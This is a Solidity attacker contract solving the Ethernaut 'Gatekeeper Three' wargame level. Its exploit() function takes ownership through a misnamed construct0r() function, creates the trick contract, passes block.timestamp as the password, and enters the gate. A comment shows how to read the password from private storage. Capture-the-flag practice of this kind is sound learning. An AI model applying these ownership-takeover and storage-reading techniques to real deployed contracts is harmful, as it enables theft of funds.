// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import { Ownable2Step } from "@openzeppelin-contracts/access/Ownable2Step.sol";
import { IGatekeeperThree } from "ethernaut/28-gatekeeper-three/IGatekeeperThree.sol";

contract GatekeeperThreeAttacker is Ownable2Step {
    IGatekeeperThree private i_gatekeeperThree;

    constructor(address payable _gatekeeperThreeAddr) {
        i_gatekeeperThree = IGatekeeperThree(_gatekeeperThreeAddr);
    }

    function exploit() external onlyOwner returns (bool) {
        // Make attacker owner of GatekeeperThree (needed to pass gateOne() modifier)
        i_gatekeeperThree.construct0r();
        // Deploy SimpleTrick (needed to pass gateTwo() modifier)
        i_gatekeeperThree.createTrick();
        // If SimpleTrick is created in the same block that getting the allowance, the password is `block.timestamp`.
        // Otherwise get the password from slot 2 in GatekeeperThreeScript via:
        // uint256 password = uint256(vm.load(address(gateKeeperThree.trick()), bytes32(uint256(2))));
        // Get the allowance
        i_gatekeeperThree.getAllowance(block.timestamp);
        // Set `entrant` as the msg sender.
        return i_gatekeeperThree.enter();
    }
}
